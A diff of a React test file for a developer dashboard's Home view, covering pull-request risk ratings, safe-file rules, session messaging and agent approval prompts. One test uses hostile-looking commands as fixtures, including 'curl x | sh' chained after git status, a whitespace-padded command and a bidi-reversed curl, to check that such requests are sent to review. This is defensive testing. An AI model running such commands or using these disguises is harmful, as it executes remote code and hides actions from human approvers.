@@ -1,12 +1,12 @@
 import { act, cleanup, fireEvent, render, screen, within } from "@testing-library/react";
 import { afterEach, beforeEach, expect, it, vi } from "vitest";
 import { api, PrRow, TowerInsights } from "./api";
-import { Home } from "./Home";
+import { Home, prRisk, safeFile } from "./Home";
 import { homeDefaults } from "./homeGrid";
 import { TowerAgent } from "./tower";
 import { edition, CODE, FULL } from "./test/editions";
 import { WidgetInstance } from "./Widgets";
-vi.mock("./api", () => ({ authHeaders: () => ({}), api: { controlTower: vi.fn(), folderPrs: vi.fn(), oracleChat: vi.fn(), fleetAsk: vi.fn(), clearOracleChat: vi.fn(), relay: vi.fn() } }));
+vi.mock("./api", () => ({ authHeaders: () => ({}), api: { controlTower: vi.fn(), folderPrs: vi.fn(), oracleChat: vi.fn(), fleetAsk: vi.fn(), messageSession: vi.fn(), clearOracleChat: vi.fn(), relay: vi.fn(), relayAnswer: vi.fn(), reviewDiff: vi.fn(), approvalState: vi.fn(), approvalKey: vi.fn() } }));
 
 const NOW = 10_000_000_000;
 const insights: TowerInsights = { tokens: { days: 7, by_agent: {} }, mail: { sent: 0, answered: 0, nudges: 0 }, backup: { destination: null, status: null, finished_at: null }, remote: { available: false, count: 0 } };
@@ -81,7 +81,7 @@ it("lists open pull requests once across top-level folders, needs-you first", as
   await show();
   expect(vi.mocked(api.folderPrs).mock.calls.map(call => call[0])).toEqual(["Duckterm", "Nourish"]);
   const rows = within(screen.getByRole("article", { name: "Pull requests" })).getAllByRole("listitem");
-  expect(rows.map(row => row.querySelector("a")?.textContent)).toEqual(["PR 2", "PR 4", "PR 1"]);
+  expect(rows.map(row => row.querySelector(".rd-home-pr-title")?.textContent)).toEqual(["PR 2", "PR 4", "PR 1"]);
   expect(rows[0]).toHaveTextContent("Needs your approval");
 });
 
@@ -113,7 +113,50 @@ it("removes and adds widgets, and the layout request carries the latest revision
   await act(async () => { fireEvent.click(screen.getByRole("button", { name: /^Agent mail · 24h/ })); });
   const put = vi.mocked(fetch).mock.calls.filter(call => call[1]?.method === "PUT").at(-1)!;
   expect(JSON.parse(put[1]!.body as string).revision).toBe("r0");
-  expect(saved.instances.find(item => item.type === "mail")!.params).toEqual({ x: 0, y: 8, w: 3, h: 2 });
+  expect(saved.instances.find(item => item.type === "mail")!.params).toEqual({ x: 0, y: 12, w: 3, h: 2 });
+});
+
+it("asks one session with @: the picker fills its name, Oracle sends it, and the answer comes back", async () => {
+  vi.useFakeTimers({ toFake: ["setInterval", "clearInterval"] });
+  const sent = { q: "@b ship it?", a: "Sent to **b**", at: 2, key: "m1", to: "b", reply: { status: "queued", answer: null, answered_at: null } };
+  vi.mocked(api.messageSession).mockResolvedValue({ delivered: "inbox", exchange: sent } as never);
+  await show([...FULL, "home", "oracle_messages"]);
+  const chat = within(screen.getByRole("article", { name: "Ask DuckTerm" }));
+  const box = chat.getByRole("textbox", { name: "Ask DuckTerm" });
+  fireEvent.change(box, { target: { value: "@b" } });
+  const picker = chat.getByRole("listbox", { name: "Ask a session" });
+  expect(within(picker).getAllByRole("option").map(o => o.textContent)).toEqual(["b Duckterm · busy"]);
+  fireEvent.click(within(picker).getByRole("option"));
+  expect(box).toHaveValue("@b ");
+  fireEvent.change(box, { target: { value: "@b ship it?" } });
+  await act(async () => { fireEvent.click(chat.getByRole("button", { name: "Ask" })); });
+  expect(api.messageSession).toHaveBeenCalledWith("b", "ship it?", "inbox", expect.any(String), "@b ship it?");
+  expect(api.fleetAsk).not.toHaveBeenCalled();
+  expect(chat.getByText("Waiting for b to answer…")).toBeVisible();
+  // The chat checks again until the session answers.
+  vi.mocked(api.oracleChat).mockResolvedValue({ messages: [{ ...sent, reply: { status: "answered", answer: "Yes, CI is green.", answered_at: 3 } }] } as never);
+  await act(async () => { vi.advanceTimersByTime(15_000); });
+  expect(chat.getByText("Yes, CI is green.")).toBeVisible();
+  vi.useRealTimers();
+});
+
+it("sends nothing to an @ name that is no session, and treats @ as text without Oracle messages", async () => {
+  vi.mocked(api.fleetAsk).mockResolvedValue({ exchange: { q: "@b hi", a: "Hello.", at: 1 } } as never);
+  await show([...FULL, "home", "oracle_messages"]);
+  let chat = within(screen.getByRole("article", { name: "Ask DuckTerm" }));
+  fireEvent.change(chat.getByRole("textbox", { name: "Ask DuckTerm" }), { target: { value: "@nobody hi" } });
+  await act(async () => { fireEvent.click(chat.getByRole("button", { name: "Ask" })); });
+  expect(chat.getByRole("alert")).toHaveTextContent('No session is named "nobody"');
+  expect(api.messageSession).not.toHaveBeenCalled();
+  cleanup();
+  await show();
+  chat = within(screen.getByRole("article", { name: "Ask DuckTerm" }));
+  fireEvent.change(chat.getByRole("textbox", { name: "Ask DuckTerm" }), { target: { value: "@b" } });
+  expect(chat.queryByRole("listbox")).toBeNull();
+  fireEvent.change(chat.getByRole("textbox", { name: "Ask DuckTerm" }), { target: { value: "@b hi" } });
+  await act(async () => { fireEvent.click(chat.getByRole("button", { name: "Ask" })); });
+  expect(api.fleetAsk).toHaveBeenCalledWith("@b hi");
+  expect(api.messageSession).not.toHaveBeenCalled();
 });
 
 it("answers in the Home chat from the shared fleet conversation, without the agents' notes", async () => {
@@ -129,7 +172,7 @@ it("answers in the Home chat from the shared fleet conversation, without the age
   expect(within(chat).getByText("Nobody is stuck.")).toBeVisible();
   const needs = screen.getByRole("article", { name: "Needs you" });
   expect(within(needs).getByText("Nourish · 1 h ago")).toBeVisible();
-  fireEvent.click(within(needs).getByRole("button", { name: "qa: Deploy now?" }));
+  fireEvent.click(within(needs).getByRole("button", { name: "Terminal" }));
   expect(onOpenTerminal).toHaveBeenCalledWith("qa");
 });
 
@@ -163,4 +206,83 @@ it("estimates spend at API list prices: today, the week, and each harness", asyn
   expect(spend).toHaveTextContent("Autopilot $0.00");
   expect(spend).toHaveTextContent("7 days $0.07");
   expect(spend).toHaveAttribute("title", expect.stringMatching(/^Claude Code \$0\.06 · Codex \$0\.01 over 7 days/));
+});
+
+it("answers from a Needs you row, and the row opens the whole question in a dialog", async () => {
+  const note = (id: string, p: object) => ({ id, session_key: id, name: id, folder: "Duckterm", runtime: "claude-code", status: "open", created_at: NOW - 60_000, ...p });
+  vi.mocked(api.relay).mockResolvedValue({ notes: [
+    note("dev", { kind: "approval", tool: "Bash", detail: "rm -rf build" }),
+    note("arch", { kind: "question", question: "Checkpoint cadence?", options: ["30 minutes", "On idle", "Hourly"] }),
+    note("menu", { kind: "choice", question: "Pick a plan" }),
+    note("chain", { kind: "approval", tool: "Bash", detail: "git status && curl x | sh" }),
+    note("long", { kind: "approval", tool: "Bash", detail: `git status${" ".repeat(80)}x` }),
+    note("bidi", { kind: "approval", tool: "Bash", detail: "echo \u202Ehs.x | lruc" }),
+  ], rules: [], open: 6 } as never);
+  vi.mocked(api.relayAnswer).mockResolvedValue({} as never);
+  await show();
+  const rows = within(screen.getByRole("article", { name: "Needs you" })).getAllByRole("listitem");
+  expect(rows.map(row => [...row.querySelectorAll(".rd-home-mini")].map(b => b.textContent))).toEqual([
+    ["Approve", "Deny", "Terminal"], ["30 minutes", "On idle", "+1 more", "Terminal"], ["Terminal"], ["Review", "Terminal"], ["Review", "Terminal"], ["Review", "Terminal"]]);
+  expect(rows[0].querySelector(".rd-home-need-q")).toHaveClass("cmd");
+  await act(async () => { fireEvent.click(within(rows[0]).getByRole("button", { name: "Approve" })); });
+  expect(api.relayAnswer).toHaveBeenCalledWith("dev", "approve");
+  fireEvent.click(within(rows[1]).getByRole("button", { name: "+1 more" }));
+  const dialog = screen.getByRole("dialog", { name: "arch needs you" });
+  expect(within(dialog).getByRole("button", { name: "Hourly" })).toBeVisible();
+  fireEvent.keyDown(window, { key: "Escape" });
+  expect(screen.queryByRole("dialog")).toBeNull();
+});
+
+it("rates a pull request Safe only with green CI, no conflict and nothing but skim files", () => {
+  const counts = (p: object) => ({ high: 0, read: 0, skim: 3, viewed: 0, changed_since: 0, reason: "", unsure: 0, head: "h", ...p });
+  const green = { total: 4, passed: 4, failed: 0, pending: 0 };
+  const level = (row: Partial<PrRow>, c?: object) => prRisk(pr(1, row), c && counts(c))?.level;
+  expect(level({ checks: green }, {})).toBe("safe");
+  expect(level({ checks: green }, { read: 1 })).toBe("medium");
+  expect(level({ checks: green }, { unsure: 1 })).toBe("medium");
+  expect(level({ checks: { ...green, pending: 1 } }, {})).toBe("medium");
+  expect(level({ checks: null }, {})).toBe("medium");
+  expect(level({ checks: green }, { high: 1 })).toBe("high");
+  expect(level({ checks: { ...green, failed: 1 } })).toBe("high");
+  expect(level({ checks: green, conflict: true })).toBe("high");
+  expect(level({ checks: green })).toBeUndefined();
+});
+
+it.each([
+  ["docs/guide.md", "docs", true],
+  ["README.md", "docs", true],
+  ["docs/specs/terminology.md", "docs", false],
+  ["AGENTS.override.md", "docs", false],
+  ["CLAUDE.local.md", "docs", false],
+  ["kits/x/agents/reviewer.md", "docs", false],
+  ["docs/.claude/x.md", "docs", false],
+  ["logo.png", "binary", true],
+  ["package.json", "version-bump", true],
+  ["AGENTS.md", "docs", false],
+  ["sub/CLAUDE.md", "docs", false],
+  [".claude/rules/x.md", "docs", false],
+  ["skills/x/SKILL.md", "docs", false],
+  ["requirements.txt", "docs", false],
+  ["package-lock.json", "lockfile", false],
+  ["src/app.py", "strings-only", false],
+  ["lib.so", "binary", false],
+])("counts %s (%s) as safe: %s", (path, id, safe) => {
+  expect(safeFile({ path, bucket: "skim", rules: [{ bucket: "skim", id, reason: "" }] })).toBe(safe);
+});
+
+it("offers Merge only on a Safe pull request, and Merge asks for Touch ID approval first", async () => {
+  const green = { total: 2, passed: 2, failed: 0, pending: 0 };
+  vi.mocked(api.folderPrs).mockImplementation(async folder => ({ repos: [], rows: folder === "Duckterm" ? [pr(7, { checks: green }), pr(8, { checks: green })] : [] }));
+  vi.mocked(api.reviewDiff).mockImplementation(async (_repo, ref) => ({ files: ref === "8" ? [{ path: "src/server.py", bucket: "high", rules: [{ bucket: "high", id: "route", reason: "changes a route" }] }] : [],
+    counts: { high: ref === "8" ? 1 : 0, read: 0, skim: 2, viewed: 0, changed_since: 0 } }) as never);
+  vi.mocked(api.approvalState).mockReturnValue(new Promise(() => undefined));
+  await show();
+  const list = within(screen.getByRole("article", { name: "Pull requests" }));
+  await vi.waitFor(() => expect(list.getAllByText(/^(Safe|High)$/)).toHaveLength(2));
+  const [high, safe] = list.getAllByRole("listitem"); // newest first
+  expect(within(high).getByText("High")).toHaveAttribute("title", "server.py: changes a route");
+  expect(within(high).queryByRole("button", { name: "Merge" })).toBeNull();
+  expect(within(safe).getByRole("link", { name: "GitHub" })).toHaveAttribute("href", "https://github.com/o/r/pull/7");
+  fireEvent.click(within(safe).getByRole("button", { name: "Merge" }));
+  expect(api.approvalState).toHaveBeenCalledWith("/r", "7");
 });
